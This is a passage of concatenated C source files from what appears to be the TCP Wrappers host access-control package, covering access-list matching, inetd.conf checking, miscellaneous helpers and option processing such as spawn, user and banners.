	if (sh_cmd) {
#ifdef PROCESS_OPTIONS
	    process_options(sh_cmd, request);
#else
	    char    cmd[BUFSIZ];
	    shell_cmd(percent_x(cmd, sizeof(cmd), sh_cmd, request));
#endif
	}
    }
    tcpd_context = saved_context;
    return (match);
}

/* list_match - match a request against a list of patterns with exceptions */

static int list_match(list, request, match_fn)
char   *list;
struct request_info *request;
int   (*match_fn) ();
{
    char   *tok;

    /*
     * Process tokens one at a time. We have exhausted all possible matches
     * when we reach an "EXCEPT" token or the end of the list. If we do find
     * a match, look for an "EXCEPT" list and recurse to determine whether
     * the match is affected by any exceptions.
     */

    for (tok = strtok(list, sep); tok != 0; tok = strtok((char *) 0, sep)) {
	if (STR_EQ(tok, "EXCEPT"))		/* EXCEPT: give up */
	    return (NO);
	if (match_fn(tok, request)) {		/* YES: look for exceptions */
	    while ((tok = strtok((char *) 0, sep)) && STR_NE(tok, "EXCEPT"))
		 /* VOID */ ;
	    return (tok == 0 || list_match((char *) 0, request, match_fn) == 0);
	}
    }
    return (NO);
}

/* server_match - match server information */

static int server_match(tok, request)
char   *tok;
struct request_info *request;
{
    char   *host;

    if ((host = split_at(tok + 1, '@')) == 0) {	/* plain daemon */
	return (string_match(tok, eval_daemon(request)));
    } else {					/* daemon@host */
	return (string_match(tok, eval_daemon(request))
		&& host_match(host, request->server));
    }
}

/* client_match - match client information */

static int client_match(tok, request)
char   *tok;
struct request_info *request;
{
    char   *host;

    if ((host = split_at(tok + 1, '@')) == 0) {	/* plain host */
	return (host_match(tok, request->client));
    } else {					/* user@host */
	return (host_match(host, request->client)
		&& string_match(tok, eval_user(request)));
    }
}

/* host_match - match host name and/or address against pattern */

static int host_match(tok, host)
char   *tok;
struct host_info *host;
{
    char   *mask;

    /*
     * This code looks a little hairy because we want to avoid unnecessary
     * hostname lookups.
     * 
     * The KNOWN pattern requires that both address AND name be known; some
     * patterns are specific to host names or to host addresses; all other
     * patterns are satisfied when either the address OR the name match.
     */

    if (tok[0] == '@') {			/* netgroup: look it up */
#ifdef  NETGROUP
	static char *mydomain = 0;
	if (mydomain == 0)
	    yp_get_default_domain(&mydomain);
	return (innetgr(tok + 1, eval_hostname(host), (char *) 0, mydomain));
#else
	tcpd_warn("netgroup support is disabled");	/* not tcpd_jump() */
	return (NO);
#endif
    } else if (STR_EQ(tok, "KNOWN")) {		/* check address and name */
	char   *name = eval_hostname(host);
	return (STR_NE(eval_hostaddr(host), unknown) && HOSTNAME_KNOWN(name));
    } else if (STR_EQ(tok, "LOCAL")) {		/* local: no dots in name */
	char   *name = eval_hostname(host);
	return (strchr(name, '.') == 0 && HOSTNAME_KNOWN(name));
    } else if ((mask = split_at(tok, '/')) != 0) {	/* net/mask */
	return (masked_match(tok, mask, eval_hostaddr(host)));
    } else {					/* anything else */
	return (string_match(tok, eval_hostaddr(host))
	    || (NOT_INADDR(tok) && string_match(tok, eval_hostname(host))));
    }
}

/* string_match - match string against pattern */

static int string_match(tok, string)
char   *tok;
char   *string;
{
    int     n;

    if (tok[0] == '.') {			/* suffix */
	n = strlen(string) - strlen(tok);
	return (n > 0 && STR_EQ(tok, string + n));
    } else if (STR_EQ(tok, "ALL")) {		/* all: match any */
	return (YES);
    } else if (STR_EQ(tok, "KNOWN")) {		/* not unknown */
	return (STR_NE(string, unknown));
    } else if (tok[(n = strlen(tok)) - 1] == '.') {	/* prefix */
	return (STRN_EQ(tok, string, n));
    } else {					/* exact match */
	return (STR_EQ(tok, string));
    }
}

/* masked_match - match address against netnumber/netmask */

static int masked_match(net_tok, mask_tok, string)
char   *net_tok;
char   *mask_tok;
char   *string;
{
    unsigned long net;
    unsigned long mask;
    unsigned long addr;

    /*
     * Disallow forms other than dotted quad: the treatment that inet_addr()
     * gives to forms with less than four components is inconsistent with the
     * access control language. John P. Rouillard <rouilj@cs.umb.edu>.
     */

    if ((addr = dot_quad_addr(string)) == INADDR_NONE)
	return (NO);
    if ((net = dot_quad_addr(net_tok)) == INADDR_NONE
	|| (mask = dot_quad_addr(mask_tok)) == INADDR_NONE) {
	tcpd_warn("bad net/mask expression: %s/%s", net_tok, mask_tok);
	return (NO);				/* not tcpd_jump() */
    }
    return ((addr & mask) == net);
}
 /*
  * hosts_ctl() combines common applications of the host access control
  * library routines. It bundles its arguments then calls the hosts_access()
  * access control checker. The host name and user name arguments should be
  * empty strings, STRING_UNKNOWN or real data. If a match is found, the
  * optional shell command is executed.
  * 
  * Restriction: this interface does not pass enough information to support
  * selective remote username lookups or selective hostname double checks.
  * 
  * Author: Wietse Venema, Eindhoven University of Technology, The Netherlands.
  */

#ifndef lint
static char sccsid[] = "@(#) hosts_ctl.c 1.4 94/12/28 17:42:27";
#endif

#include <stdio.h>

#include "tcpd.h"

/* hosts_ctl - limited interface to the hosts_access() routine */

int     hosts_ctl(daemon, name, addr, user)
char   *daemon;
char   *name;
char   *addr;
char   *user;
{
    struct request_info request;

    return (hosts_access(request_init(&request,
				      RQ_DAEMON, daemon,
				      RQ_CLIENT_NAME, name,
				      RQ_CLIENT_ADDR, addr,
				      RQ_USER, user,
				      0)));
}
 /*
  * Routines to parse an inetd.conf or tlid.conf file. This would be a great
  * job for a PERL script.
  * 
  * Author: Wietse Venema, Eindhoven University of Technology, The Netherlands.
  */

#ifndef lint
static char sccsid[] = "@(#) inetcf.c 1.6 96/02/11 17:01:29";
#endif

#include <sys/types.h>
#include <sys/stat.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>

extern int errno;
extern void exit();

#include "tcpd.h"
#include "inetcf.h"

 /*
  * Network configuration files may live in unusual places. Here are some
  * guesses. Shorter names follow longer ones.
  */
char   *inet_files[] = {
    "/private/etc/inetd.conf",		/* NEXT */
    "/etc/inet/inetd.conf",		/* SYSV4 */
    "/usr/etc/inetd.conf",		/* IRIX?? */
    "/etc/inetd.conf",			/* BSD */
    "/etc/net/tlid.conf",		/* SYSV4?? */
    "/etc/saf/tlid.conf",		/* SYSV4?? */
    "/etc/tlid.conf",			/* SYSV4?? */
    0,
};

static void inet_chk();
static char *base_name();

 /*
  * Structure with everything we know about a service.
  */
struct inet_ent {
    struct inet_ent *next;
    int     type;
    char    name[1];
};

static struct inet_ent *inet_list = 0;

static char whitespace[] = " \t\r\n";

/* inet_conf - read in and examine inetd.conf (or tlid.conf) entries */

char   *inet_cfg(conf)
char   *conf;
{
    char    buf[BUFSIZ];
    FILE   *fp;
    char   *service;
    char   *protocol;
    char   *user;
    char   *path;
    char   *arg0;
    char   *arg1;
    struct tcpd_context saved_context;
    char   *percent_m();
    int     i;
    struct stat st;

    saved_context = tcpd_context;

    /*
     * The inetd.conf (or tlid.conf) information is so useful that we insist
     * on its availability. When no file is given run a series of educated
     * guesses.
     */
    if (conf != 0) {
	if ((fp = fopen(conf, "r")) == 0) {
	    fprintf(stderr, percent_m(buf, "open %s: %m\n"), conf);
	    exit(1);
	}
    } else {
	for (i = 0; inet_files[i] && (fp = fopen(inet_files[i], "r")) == 0; i++)
	     /* void */ ;
	if (fp == 0) {
	    fprintf(stderr, "Cannot find your inetd.conf or tlid.conf file.\n");
	    fprintf(stderr, "Please specify its location.\n");
	    exit(1);
	}
	conf = inet_files[i];
	check_path(conf, &st);
    }

    /*
     * Process the file. After the 7.0 wrapper release it became clear that
     * there are many more inetd.conf formats than the 8 systems that I had
     * studied. EP/IX uses a two-line specification for rpc services; HP-UX
     * permits long lines to be broken with backslash-newline.
     */
    tcpd_context.file = conf;
    tcpd_context.line = 0;
    while (xgets(buf, sizeof(buf), fp)) {
	service = strtok(buf, whitespace);	/* service */
	if (service == 0 || *service == '#')
	    continue;
	if (STR_NE(service, "stream") && STR_NE(service, "dgram"))
	    strtok((char *) 0, whitespace);	/* endpoint */
	protocol = strtok((char *) 0, whitespace);
	(void) strtok((char *) 0, whitespace);	/* wait */
	if ((user = strtok((char *) 0, whitespace)) == 0)
	    continue;
	if (user[0] == '/') {			/* user */
	    path = user;
	} else {				/* path */
	    if ((path = strtok((char *) 0, whitespace)) == 0)
		continue;
	}
	if (STR_EQ(path, "internal"))
	    continue;
	if (path[strspn(path, "-0123456789")] == 0) {

	    /*
	     * ConvexOS puts RPC version numbers before path names. Jukka
	     * Ukkonen <ukkonen@csc.fi>.
	     */
	    if ((path = strtok((char *) 0, whitespace)) == 0)
		continue;
	}
	if ((arg0 = strtok((char *) 0, whitespace)) == 0) {
	    tcpd_warn("incomplete line");
	    continue;
	}
	if (arg0[strspn(arg0, "0123456789")] == 0) {

	    /*
	     * We're reading a tlid.conf file, the format is:
	     * 
	     * ...stuff... path arg_count arguments mod_count modules
	     */
	    if ((arg0 = strtok((char *) 0, whitespace)) == 0) {
		tcpd_warn("incomplete line");
		continue;
	    }
	}
	if ((arg1 = strtok((char *) 0, whitespace)) == 0)
	    arg1 = "";

	inet_chk(protocol, path, arg0, arg1);
    }
    fclose(fp);
    tcpd_context = saved_context;
    return (conf);
}

/* inet_chk - examine one inetd.conf (tlid.conf?) entry */

static void inet_chk(protocol, path, arg0, arg1)
char   *protocol;
char   *path;
char   *arg0;
char   *arg1;
{
    char    daemon[BUFSIZ];
    struct stat st;
    int     wrap_status = WR_MAYBE;
    char   *base_name_path = base_name(path);
    char   *tcpd_proc_name = (arg0[0] == '/' ? base_name(arg0) : arg0);

    /*
     * Always warn when the executable does not exist or when it is not
     * executable.
     */
    if (check_path(path, &st) < 0) {
	tcpd_warn("%s: not found: %m", path);
    } else if ((st.st_mode & 0100) == 0) {
	tcpd_warn("%s: not executable", path);
    }

    /*
     * Cheat on the miscd tests, nobody uses it anymore.
     */
    if (STR_EQ(base_name_path, "miscd")) {
	inet_set(arg0, WR_YES);
	return;
    }

    /*
     * While we are here...
     */
    if (STR_EQ(tcpd_proc_name, "rexd") || STR_EQ(tcpd_proc_name, "rpc.rexd"))
	tcpd_warn("%s may be an insecure service", tcpd_proc_name);

    /*
     * The tcpd program gets most of the attention.
     */
    if (STR_EQ(base_name_path, "tcpd")) {

	if (STR_EQ(tcpd_proc_name, "tcpd"))
	    tcpd_warn("%s is recursively calling itself", tcpd_proc_name);

	wrap_status = WR_YES;

	/*
	 * Check: some sites install the wrapper set-uid.
	 */
	if ((st.st_mode & 06000) != 0)
	    tcpd_warn("%s: file is set-uid or set-gid", path);

	/*
	 * Check: some sites insert tcpd in inetd.conf, instead of replacing
	 * the daemon pathname.
	 */
	if (arg0[0] == '/' && STR_EQ(tcpd_proc_name, base_name(arg1)))
	    tcpd_warn("%s inserted before %s", path, arg0);

	/*
	 * Check: make sure files exist and are executable. On some systems
	 * the network daemons are set-uid so we cannot complain. Note that
	 * tcpd takes the basename only in case of absolute pathnames.
	 */
	if (arg0[0] == '/') {			/* absolute path */
	    if (check_path(arg0, &st) < 0) {
		tcpd_warn("%s: not found: %m", arg0);
	    } else if ((st.st_mode & 0100) == 0) {
		tcpd_warn("%s: not executable", arg0);
	    }
	} else {				/* look in REAL_DAEMON_DIR */
	    sprintf(daemon, "%s/%s", REAL_DAEMON_DIR, arg0);
	    if (check_path(daemon, &st) < 0) {
		tcpd_warn("%s: not found in %s: %m",
			  arg0, REAL_DAEMON_DIR);
	    } else if ((st.st_mode & 0100) == 0) {
		tcpd_warn("%s: not executable", daemon);
	    }
	}

    } else {

	/*
	 * No tcpd program found. Perhaps they used the "simple installation"
	 * recipe. Look for a file with the same basename in REAL_DAEMON_DIR.
	 * Draw some conservative conclusions when a distinct file is found.
	 */
	sprintf(daemon, "%s/%s", REAL_DAEMON_DIR, arg0);
	if (STR_EQ(path, daemon)) {
	    wrap_status = WR_NOT;
	} else if (check_path(daemon, &st) >= 0) {
	    wrap_status = WR_MAYBE;
	} else if (errno == ENOENT) {
	    wrap_status = WR_NOT;
	} else {
	    tcpd_warn("%s: file lookup: %m", daemon);
	    wrap_status = WR_MAYBE;
	}
    }

    /*
     * Alas, we cannot wrap rpc/tcp services.
     */
    if (wrap_status == WR_YES && STR_EQ(protocol, "rpc/tcp"))
	tcpd_warn("%s: cannot wrap rpc/tcp services", tcpd_proc_name);

    inet_set(tcpd_proc_name, wrap_status);
}

/* inet_set - remember service status */

void    inet_set(name, type)
char   *name;
int     type;
{
    struct inet_ent *ip =
    (struct inet_ent *) malloc(sizeof(struct inet_ent) + strlen(name));

    if (ip == 0) {
	fprintf(stderr, "out of memory\n");
	exit(1);
    }
    ip->next = inet_list;
    strcpy(ip->name, name);
    ip->type = type;
    inet_list = ip;
}

/* inet_get - look up service status */

int     inet_get(name)
char   *name;
{
    struct inet_ent *ip;

    if (inet_list == 0)
	return (WR_MAYBE);

    for (ip = inet_list; ip; ip = ip->next)
	if (STR_EQ(ip->name, name))
	    return (ip->type);

    return (-1);
}

/* base_name - compute last pathname component */

static char *base_name(path)
char   *path;
{
    char   *cp;

    if ((cp = strrchr(path, '/')) != 0)
	path = cp + 1;
    return (path);
}
 /*
  * @(#) inetcf.h 1.1 94/12/28 17:42:30
  * 
  * Author: Wietse Venema, Eindhoven University of Technology, The Netherlands.
  */

extern char *inet_cfg();		/* read inetd.conf file */
extern void inet_set();			/* remember internet service */
extern int inet_get();			/* look up internet service */

#define WR_UNKNOWN	(-1)		/* service unknown */
#define WR_NOT		1		/* may not be wrapped */
#define WR_MAYBE	2		/* may be wrapped */
#define	WR_YES		3		/* service is wrapped */
 /*
  * Misc routines that are used by tcpd and by tcpdchk.
  * 
  * Author: Wietse Venema, Eindhoven University of Technology, The Netherlands.
  */

#ifndef lint
static char sccsic[] = "@(#) misc.c 1.2 96/02/11 17:01:29";
#endif

#include <sys/types.h>
#include <sys/param.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <string.h>

#include "tcpd.h"

extern char *fgets();

#ifndef	INADDR_NONE
#define	INADDR_NONE	(-1)		/* XXX should be 0xffffffff */
#endif

/* xgets - fgets() with backslash-newline stripping */

char   *xgets(ptr, len, fp)
char   *ptr;
int     len;
FILE   *fp;
{
    int     got;
    char   *start = ptr;

    while (fgets(ptr, len, fp)) {
	got = strlen(ptr);
	if (got >= 1 && ptr[got - 1] == '\n') {
	    tcpd_context.line++;
	    if (got >= 2 && ptr[got - 2] == '\\') {
		got -= 2;
	    } else {
		return (start);
	    }
	}
	ptr += got;
	len -= got;
	ptr[0] = 0;
    }
    return (ptr > start ? start : 0);
}

/* split_at - break string at delimiter or return NULL */

char   *split_at(string, delimiter)
char   *string;
int     delimiter;
{
    char   *cp;

    if ((cp = strchr(string, delimiter)) != 0)
	*cp++ = 0;
    return (cp);
}

/* dot_quad_addr - convert dotted quad to internal form */

unsigned long dot_quad_addr(str)
char   *str;
{
    int     in_run = 0;
    int     runs = 0;
    char   *cp = str;

    /* Count the number of runs of non-dot characters. */

    while (*cp) {
	if (*cp == '.') {
	    in_run = 0;
	} else if (in_run == 0) {
	    in_run = 1;
	    runs++;
	}
	cp++;
    }
    return (runs == 4 ? inet_addr(str) : INADDR_NONE);
}
 /*
  * Front end to the ULTRIX miscd service. The front end logs the remote host
  * name and then invokes the real miscd daemon. Install as "/usr/etc/miscd",
  * after renaming the real miscd daemon to the name defined with the
  * REAL_MISCD macro.
  * 
  * Connections and diagnostics are logged through syslog(3).
  * 
  * The Ultrix miscd program implements (among others) the systat service, which
  * pipes the output from who(1) to stdout. This information is potentially
  * useful to systems crackers.
  * 
  * Author: Wietse Venema, Eindhoven University of Technology, The Netherlands.
  */

#ifndef lint
static char sccsid[] = "@(#) miscd.c 1.10 96/02/11 17:01:30";
#endif

/* System libraries. */

#include <sys/types.h>
#include <sys/param.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdio.h>
#include <syslog.h>

#ifndef MAXPATHNAMELEN
#define MAXPATHNAMELEN	BUFSIZ
#endif

#ifndef STDIN_FILENO
#define STDIN_FILENO	0
#endif

/* Local stuff. */

#include "patchlevel.h"
#include "tcpd.h"

int     allow_severity = SEVERITY;	/* run-time adjustable */
int     deny_severity = LOG_WARNING;	/* ditto */

main(argc, argv)
int     argc;
char  **argv;
{
    struct request_info request;
    char    path[MAXPATHNAMELEN];

    /* Attempt to prevent the creation of world-writable files. */

#ifdef DAEMON_UMASK
    umask(DAEMON_UMASK);
#endif

    /*
     * Open a channel to the syslog daemon. Older versions of openlog()
     * require only two arguments.
     */

#ifdef LOG_MAIL
    (void) openlog(argv[0], LOG_PID, FACILITY);
#else
    (void) openlog(argv[0], LOG_PID);
#endif

    /*
     * Find out the endpoint addresses of this conversation. Host name
     * lookups and double checks will be done on demand.
     */

    request_init(&request, RQ_DAEMON, argv[0], RQ_FILE, STDIN_FILENO, 0);
    fromhost(&request);

    /*
     * Optionally look up and double check the remote host name. Sites
     * concerned with security may choose to refuse connections from hosts
     * that pretend to have someone elses host name.
     */

#ifdef PARANOID
    if (STR_EQ(eval_hostname(request.client), paranoid))
	refuse(&request);
#endif

    /*
     * The BSD rlogin and rsh daemons that came out after 4.3 BSD disallow
     * socket options at the IP level. They do so for a good reason.
     * Unfortunately, we cannot use this with SunOS 4.1.x because the
     * getsockopt() system call can panic the system.
     */

#ifdef KILL_IP_OPTIONS
    fix_options(&request);
#endif

    /*
     * Check whether this host can access the service in argv[0]. The
     * access-control code invokes optional shell commands as specified in
     * the access-control tables.
     */

#ifdef HOSTS_ACCESS
    if (!hosts_access(&request))
	refuse(&request);
#endif

    /* Report request and invoke the real daemon program. */

    syslog(allow_severity, "connect from %s", eval_client(&request));
    sprintf(path, "%s/miscd", REAL_DAEMON_DIR);
    closelog();
    (void) execv(path, argv);
    syslog(LOG_ERR, "error: cannot execute %s: %m", path);
    clean_exit(&request);
    /* NOTREACHED */
}

 /*
  * What follows is an attempt to unify varargs.h and stdarg.h. I'd rather
  * have this than #ifdefs all over the code.
  */

#ifdef __STDC__
#include <stdarg.h>
#define VARARGS(func,type,arg) func(type arg, ...)
#define VASTART(ap,type,name)  va_start(ap,name)
#define VAEND(ap)              va_end(ap)
#else
#include <varargs.h>
#define VARARGS(func,type,arg) func(va_alist) va_dcl
#define VASTART(ap,type,name)  {type name; va_start(ap); name = va_arg(ap, type)
#define VAEND(ap)              va_end(ap);}
#endif

extern char *percent_m();
 /*
  * vsyslog() for sites without. In order to enable this code, build with
  * -Dvsyslog=myvsyslog. We use a different name so that no accidents will
  * happen when vsyslog() exists. On systems with vsyslog(), syslog() is
  * typically implemented in terms of vsyslog().
  * 
  * Author: Wietse Venema, Eindhoven University of Technology, The Netherlands.
  */

#ifndef lint
static char sccsid[] = "@(#) myvsyslog.c 1.1 94/12/28 17:42:33";
#endif

#ifdef vsyslog

#include <stdio.h>

#include "tcpd.h"
#include "mystdarg.h"

myvsyslog(severity, format, ap)
int     severity;
char   *format;
va_list ap;
{
    char    fbuf[BUFSIZ];
    char    obuf[3 * STRING_LENGTH];

    vsprintf(obuf, percent_m(fbuf, format), ap);
    syslog(severity, "%s", obuf);
}

#endif
 /*
  * This part for NCR UNIX with is from Andrew Maffei (arm@aqua.whoi.edu). It
  * assumes TLI throughout. In order to look up endpoint address information
  * we must talk to the "timod" streams module. For some reason "timod" wants
  * to sit directly on top of the device driver. Therefore we pop off all
  * streams modules except the driver, install the "timod" module so that we
  * can figure out network addresses, and then restore the original state.
  */

#ifndef lint
static char sccsid[] = "@(#) ncr.c 1.1 94/12/28 17:42:34";
#endif

#include <sys/types.h>
#include <stdio.h>
#include <syslog.h>
#include <sys/tiuser.h>
#include <stropts.h>
#include <sys/conf.h>

#include "tcpd.h"

#define MAX_MODULE_COUNT	10	/* XXX */

/* fromhost - tear down the streams stack then rebuild it */

void    fromhost(request)
struct request_info *request;
{
    int     i;
    int     num_mod;
    struct str_list str_list;
    struct str_mlist mod_buffer[MAX_MODULE_COUNT];
    int     fd = request->fd;

    str_list.sl_nmods = MAX_MODULE_COUNT;
    str_list.sl_modlist = &mod_buffer[0];

    /*
     * On systems with WIN streams support we have to be careful about what
     * is on the stream we are passed. This code POPs off all modules above
     * the pseudo driver, pushes timod, gets the host address information,
     * pops timod and then pushes all modules back on the stream.
     * 
     * Some state may be lost in this process. /usr/etc/tlid seems to do special
     * things to the stream depending on the TCP port being serviced. (not a
     * very nice thing to do!). It is unclear what to do if this code breaks
     * - the stream may be left in an unknown condition.
     */
    if ((num_mod = ioctl(fd, I_LIST, NULL)) < 0)
	tcpd_warn("fromhost: LIST failed: %m");
    if (ioctl(fd, I_LIST, &str_list) < 0)
	tcpd_warn("fromhost: LIST failed: %m");

    /*
     * POP stream modules except for the driver.
     */
    for (i = 0; i < num_mod - 1; i++)
	if (ioctl(fd, I_POP, 0) < 0)
	    tcpd_warn("fromhost: POP %s: %m", mod_buffer[i].l_name);

    /*
     * PUSH timod so that host address ioctls can be executed.
     */
    if (ioctl(fd, I_PUSH, "timod") < 0)
	tcpd_warn("fromhost: PUSH timod: %m");
    tli_host(request);

    /*
     * POP timod, we're done with it now.
     */
    if (ioctl(fd, I_POP, 0) < 0)
	tcpd_warn("fromhost: POP timod: %m");

    /*
     * Restore stream modules.
     */
    for (i = num_mod - 2; i >= 0; i--)
	if (ioctl(fd, I_PUSH, mod_buffer[i].l_name) < 0)
	    tcpd_warn("fromhost: PUSH %s: %m", mod_buffer[i].l_name);
}
 /*
  * General skeleton for adding options to the access control language. The
  * features offered by this module are documented in the hosts_options(5)
  * manual page (source file: hosts_options.5, "nroff -man" format).
  * 
  * Notes and warnings for those who want to add features:
  * 
  * In case of errors, abort options processing and deny access. There are too
  * many irreversible side effects to make error recovery feasible. For
  * example, it makes no sense to continue after we have already changed the
  * userid.
  * 
  * In case of errors, do not terminate the process: the routines might be
  * called from a long-running daemon that should run forever. Instead, call
  * tcpd_jump() which does a non-local goto back into the hosts_access()
  * routine.
  * 
  * In case of severe errors, use clean_exit() instead of directly calling
  * exit(), or the inetd may loop on an UDP request.
  * 
  * In verification mode (for example, with the "tcpdmatch" command) the
  * "dry_run" flag is set. In this mode, an option function should just "say"
  * what it is going to do instead of really doing it.
  * 
  * Some option functions do not return (for example, the twist option passes
  * control to another program). In verification mode (dry_run flag is set)
  * such options should clear the "dry_run" flag to inform the caller of this
  * course of action.
  */

#ifndef lint
static char sccsid[] = "@(#) options.c 1.17 96/02/11 17:01:31";
#endif

/* System libraries. */

#include <sys/types.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdio.h>
#include <syslog.h>
#include <pwd.h>
#include <grp.h>
#include <ctype.h>
#include <setjmp.h>
#include <string.h>

#ifndef MAXPATHNAMELEN
#define MAXPATHNAMELEN  BUFSIZ
#endif

/* Local stuff. */

#include "tcpd.h"

/* Options runtime support. */

int     dry_run = 0;			/* flag set in verification mode */
extern jmp_buf tcpd_buf;		/* tcpd_jump() support */

/* Options parser support. */

static char whitespace_eq[] = "= \t\r\n";
#define whitespace (whitespace_eq + 1)

static char *get_field();		/* chew :-delimited field off string */
static char *chop_string();		/* strip leading and trailing blanks */

/* List of functions that implement the options. Add yours here. */

static void user_option();		/* execute "user name.group" option */
static void group_option();		/* execute "group name" option */
static void umask_option();		/* execute "umask mask" option */
static void linger_option();		/* execute "linger time" option */
static void keepalive_option();		/* execute "keepalive" option */
static void spawn_option();		/* execute "spawn command" option */
static void twist_option();		/* execute "twist command" option */
static void rfc931_option();		/* execute "rfc931" option */
static void setenv_option();		/* execute "setenv name value" */
static void nice_option();		/* execute "nice" option */
static void severity_option();		/* execute "severity value" */
static void allow_option();		/* execute "allow" option */
static void deny_option();		/* execute "deny" option */
static void banners_option();		/* execute "banners path" option */

/* Structure of the options table. */

struct option {
    char   *name;			/* keyword name, case is ignored */
    void  (*func) ();			/* function that does the real work */
    int     flags;			/* see below... */
};

#define NEED_ARG	(1<<1)		/* option requires argument */
#define USE_LAST	(1<<2)		/* option must be last */
#define OPT_ARG		(1<<3)		/* option has optional argument */
#define EXPAND_ARG	(1<<4)		/* do %x expansion on argument */

#define need_arg(o)	((o)->flags & NEED_ARG)
#define opt_arg(o)	((o)->flags & OPT_ARG)
#define permit_arg(o)	((o)->flags & (NEED_ARG | OPT_ARG))
#define use_last(o)	((o)->flags & USE_LAST)
#define expand_arg(o)	((o)->flags & EXPAND_ARG)

/* List of known keywords. Add yours here. */

static struct option option_table[] = {
    "user", user_option, NEED_ARG,
    "group", group_option, NEED_ARG,
    "umask", umask_option, NEED_ARG,
    "linger", linger_option, NEED_ARG,
    "keepalive", keepalive_option, 0,
    "spawn", spawn_option, NEED_ARG | EXPAND_ARG,
    "twist", twist_option, NEED_ARG | EXPAND_ARG | USE_LAST,
    "rfc931", rfc931_option, OPT_ARG,
    "setenv", setenv_option, NEED_ARG | EXPAND_ARG,
    "nice", nice_option, OPT_ARG,
    "severity", severity_option, NEED_ARG,
    "allow", allow_option, USE_LAST,
    "deny", deny_option, USE_LAST,
    "banners", banners_option, NEED_ARG,
    0,
};

/* process_options - process access control options */

void    process_options(options, request)
char   *options;
struct request_info *request;
{
    char   *key;
    char   *value;
    char   *curr_opt;
    char   *next_opt;
    struct option *op;
    char    bf[BUFSIZ];

    for (curr_opt = get_field(options); curr_opt; curr_opt = next_opt) {
	next_opt = get_field((char *) 0);

	/*
	 * Separate the option into name and value parts. For backwards
	 * compatibility we ignore exactly one '=' between name and value.
	 */
	curr_opt = chop_string(curr_opt);
	if (*(value = curr_opt + strcspn(curr_opt, whitespace_eq))) {
	    if (*value != '=') {
		*value++ = 0;
		value += strspn(value, whitespace);
	    }
	    if (*value == '=') {
		*value++ = 0;
		value += strspn(value, whitespace);
	    }
	}
	if (*value == 0)
	    value = 0;
	key = curr_opt;

	/*
	 * Disallow missing option names (and empty option fields).
	 */
	if (*key == 0)
	    tcpd_jump("missing option name");

	/*
	 * Lookup the option-specific info and do some common error checks.
	 * Delegate option-specific processing to the specific functions.
	 */

	for (op = option_table; op->name && STR_NE(op->name, key); op++)
	     /* VOID */ ;
	if (op->name == 0)
	    tcpd_jump("bad option name: \"%s\"", key);
	if (!value && need_arg(op))
	    tcpd_jump("option \"%s\" requires value", key);
	if (value && !permit_arg(op))
	    tcpd_jump("option \"%s\" requires no value", key);
	if (next_opt && use_last(op))
	    tcpd_jump("option \"%s\" must be at end", key);
	if (value && expand_arg(op))
	    value = chop_string(percent_x(bf, sizeof(bf), value, request));
	if (hosts_access_verbose)
	    syslog(LOG_DEBUG, "option:   %s %s", key, value ? value : "");
	(*(op->func)) (value, request);
    }
}

/* allow_option - grant access */

/* ARGSUSED */

static void allow_option(value, request)
char   *value;
struct request_info *request;
{
    longjmp(tcpd_buf, AC_PERMIT);
}

/* deny_option - deny access */

/* ARGSUSED */

static void deny_option(value, request)
char   *value;
struct request_info *request;
{
    longjmp(tcpd_buf, AC_DENY);
}

/* banners_option - expand %<char>, terminate each line with CRLF */

static void banners_option(value, request)
char   *value;
struct request_info *request;
{
    char    path[MAXPATHNAMELEN];
    char    ibuf[BUFSIZ];
    char    obuf[2 * BUFSIZ];
    struct stat st;
    int     ch;
    FILE   *fp;

    sprintf(path, "%s/%s", value, eval_daemon(request));
    if ((fp = fopen(path, "r")) != 0) {
	while ((ch = fgetc(fp)) == 0)
	    write(request->fd, "", 1);
	ungetc(ch, fp);
	while (fgets(ibuf, sizeof(ibuf) - 1, fp)) {
	    if (split_at(ibuf, '\n'))
		strcat(ibuf, "\r\n");
	    percent_x(obuf, sizeof(obuf), ibuf, request);
	    write(request->fd, obuf, strlen(obuf));
	}
	fclose(fp);
    } else if (stat(value, &st) < 0) {
	tcpd_warn("%s: %m", value);
    }
}

/* group_option - switch group id */

/* ARGSUSED */

static void group_option(value, request)
char   *value;
struct request_info *request;
{
    struct group *grp;
    struct group *getgrnam();

    if ((grp = getgrnam(value)) == 0)
	tcpd_jump("unknown group: \"%s\"", value);
    endgrent();

    if (dry_run == 0 && setgid(grp->gr_gid))
	tcpd_jump("setgid(%s): %m", value);
}

/* user_option - switch user id */

/* ARGSUSED */

static void user_option(value, request)
char   *value;
struct request_info *request;
{
    struct passwd *pwd;
    struct passwd *getpwnam();
    char   *group;

    if ((group = split_at(value, '.')) != 0)
	group_option(group, request);
    if ((pwd = getpwnam(value)) == 0)
	tcpd_jump("unknown user: \"%s\"", value);
    endpwent();

    if (dry_run == 0 && setuid(pwd->pw_uid))
	tcpd_jump("setuid(%s): %m", value);
}

/* umask_option - set file creation mask */

/* ARGSUSED */

static void umask_option(value, request)
char   *value;
struct request_info *request;
{
    unsigned mask;
    char    junk;

    if (sscanf(value, "%o%c", &mask, &junk) != 1 || (mask & 0777) != mask)
	tcpd_jump("bad umask value: \"%s\"", value);
    (void) umask(mask);
}

/* spawn_option - spawn a shell command and wait */

/* ARGSUSED */

static void spawn_option(value, request)
char   *value;
struct request_info *request;
{
    if (dry_run == 0)
	shell_cmd(value);
}

/* linger_option - set the socket linger time (Marc Boucher <marc@cam.org>) */

/* ARGSUSED */

static void linger_option(value, request)
char   *value;
struct request_info *request;
{
    struct linger linger;
    char    junk;

    if (sscanf(value, "%d%c", &linger.l_linger, &junk) != 1
	|| linger.l_linger < 0)
	tcpd_jump("bad linger value: \"%s\"", value);
    if (dry_run == 0) {
	linger.l_onoff = (linger.l_linger != 0);
	if (setsockopt(request->fd, SOL_SOCKET, SO_LINGER, (char *) &linger,
		       sizeof(linger)) < 0)
	    tcpd_warn("setsockopt SO_LINGER %d: %m", linger.l_linger);
    }
}

/* keepalive_option - set the socket keepalive option */

/* ARGSUSED */

static void keepalive_option(value, request)
char   *value;
struct request_info *request;
{
    static int on = 1;

    if (dry_run == 0 && setsockopt(request->fd, SOL_SOCKET, SO_KEEPALIVE,
				   (char *) &on, sizeof(on)) < 0)
	tcpd_warn("setsockopt SO_KEEPALIVE: %m");
}

/* nice_option - set nice value */

/* ARGSUSED */

